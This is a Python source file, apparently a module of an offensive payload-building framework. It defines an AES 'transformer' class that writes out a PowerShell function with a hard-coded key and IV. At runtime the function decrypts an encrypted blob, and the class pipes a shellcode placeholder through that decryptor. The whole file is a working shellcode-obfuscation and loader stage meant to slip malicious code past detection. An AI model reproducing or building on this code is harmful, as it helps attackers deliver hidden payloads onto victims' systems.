from utils.utils import bytes_to_ps1
from common.transformers.AESEncrypt import AESEncryptBase

class AESEncrypt(AESEncryptBase):

    def __init__(self, arguments):
        super().__init__(arguments) 

    def codeblock(self):
        return f"""
function {self.name} {{
    [CmdletBinding()]
    [OutputType([byte[]])]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [byte[]]$CipherBytes,

        [System.Security.Cryptography.CipherMode]$Mode =
            [System.Security.Cryptography.CipherMode]::CBC,

        [System.Security.Cryptography.PaddingMode]$Padding =
            [System.Security.Cryptography.PaddingMode]::PKCS7
    )
    begin {{
        $buffer = [System.Collections.Generic.List[byte]]::new()
    }}
    process {{
        $buffer.AddRange($CipherBytes)
    }}
    end {{
        $cipher = $buffer.ToArray()
        {bytes_to_ps1(self.key, 'Key')}
        {bytes_to_ps1(self.iv, 'IV')}

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key     = $Key
        $aes.Mode    = $Mode
        $aes.Padding = $Padding
        $aes.IV = $IV

        $decryptor = $aes.CreateDecryptor()
        return $decryptor.TransformFinalBlock($cipher, 0, {self.ciphertextSize})
    }}
}}
"""

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{{shellcode}} | {self.name}')